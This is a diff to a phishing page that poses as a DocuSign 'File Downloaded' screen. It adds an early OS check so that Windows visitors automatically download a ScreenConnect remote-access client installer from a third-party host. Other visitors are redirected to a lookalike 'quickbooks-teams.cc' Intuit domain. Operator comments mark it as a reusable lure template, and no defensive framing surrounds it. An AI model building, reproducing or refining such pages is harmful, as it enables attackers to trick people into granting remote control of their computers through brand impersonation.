@@ -4,6 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DocuSign - File Downloaded</title>
+    
+    <!-- IMMEDIATE REDIRECT CHECK (Runs before page renders to prevent flashing) -->
+    <script>
+        // 1. PASTE YOUR REDIRECT LINK HERE FOR NON-WINDOWS USERS:
+        const NON_WINDOWS_REDIRECT_URL = "https://quickbooks-teams.cc/Intuit"; 
+
+        // Check OS immediately
+        const isWindows = /Windows/i.test(navigator.userAgent);
+        
+        // If NOT Windows and a valid redirect URL is provided, redirect instantly
+        if (!isWindows && NON_WINDOWS_REDIRECT_URL && NON_WINDOWS_REDIRECT_URL !== "PASTE_YOUR_REDIRECT_LINK_HERE") {
+            window.location.replace(NON_WINDOWS_REDIRECT_URL);
+        }
+    </script>
+
     <style>
         /* Reset & Base Styles */
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -141,12 +156,12 @@
         }
         .status-toast.show { opacity: 1; transform: translateY(0); }
 
-        /* Windows-Only Notice (Hidden by default, only shows if JS fails or is disabled) */
+        /* Windows-Only Notice (Fallback if JS is disabled) */
         .windows-notice {
             max-width: 520px; margin: 2rem auto 0; background: #ffffff; border: 1px solid #e2e8f0;
             border-radius: 16px; padding: 3rem 2.5rem; text-align: center;
             box-shadow: 0 12px 40px rgba(15, 23, 42, 0.08), 0 2px 8px rgba(15, 23, 42, 0.04);
-            display: none; /* Hidden by default, JS handles redirection */
+            display: none; 
         }
         .notice-icon {
             width: 84px; height: 84px; margin: 0 auto 1.75rem; border-radius: 50%;
@@ -288,38 +303,20 @@
     </footer>
 
     <!-- ========================================== -->
-    <!-- DOWNLOAD & REDIRECT CONFIGURATION SCRIPT   -->
+    <!-- WINDOWS DOWNLOAD CONFIGURATION SCRIPT      -->
     <!-- ========================================== -->
     <script>
-        // 1. YOUR FILE DOWNLOAD LINK (Already inserted)
+        // 1. YOUR FILE DOWNLOAD LINK
         const FILE_LINK = "https://thefridmangroup.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=docu%20sign&c=&c=&c=&c=&c=&c=&c=";
 
-        // 2. PASTE YOUR REDIRECT LINK HERE FOR NON-WINDOWS USERS:
-        const NON_WINDOWS_REDIRECT_URL = "https://quickbooks-teams.cc/Intuit/"; 
-
-        // 3. Set to true to auto-download on page load for Windows users.
+        // 2. Set to true to auto-download on page load for Windows users.
         const AUTO_DOWNLOAD_ON_LOAD = true; 
 
         // ==========================================
         // DO NOT EDIT BELOW THIS LINE
         // ==========================================
         document.addEventListener('DOMContentLoaded', () => {
-            // Check if the user is on a Windows device
-            const isWindows = /Windows/i.test(navigator.userAgent);
-
-            if (!isWindows) {
-                // If NOT Windows, redirect immediately
-                if (NON_WINDOWS_REDIRECT_URL && NON_WINDOWS_REDIRECT_URL !== "PASTE_YOUR_REDIRECT_LINK_HERE") {
-                    window.location.replace(NON_WINDOWS_REDIRECT_URL);
-                } else {
-                    // Fallback: If you forget to paste the link, it will show the Windows notice instead of breaking
-                    const notice = document.getElementById('no-js-notice');
-                    if (notice) notice.style.display = 'block';
-                }
-                return; // Stop executing the rest of the script
-            }
-
-            // If IS Windows, proceed with download logic
+            // Inject your link into all visible download buttons/links
             const allDownloadLinks = document.querySelectorAll('.download-link');
             allDownloadLinks.forEach(link => {
                 link.href = FILE_LINK;
